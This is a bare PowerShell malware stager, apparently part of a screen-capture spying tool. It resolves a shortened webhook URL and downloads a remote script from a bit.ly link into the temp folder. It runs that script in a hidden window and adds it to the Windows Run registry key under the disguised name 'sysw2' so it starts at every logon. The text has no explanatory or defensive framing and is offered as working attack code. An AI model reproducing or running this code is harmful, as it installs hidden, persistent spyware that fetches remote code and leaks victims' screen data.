if ($hookurl.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $hookurl = (irm $hookurl).url}

$scriptUrl = "https://bit.ly/Screen_dc"
$scriptPath = "$env:temp\capture_script.ps1"
Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath
Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-File $scriptPath"

$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regPath -Name "sysw2" -Value "powershell.exe -WindowStyle Hidden -File $scriptPath"
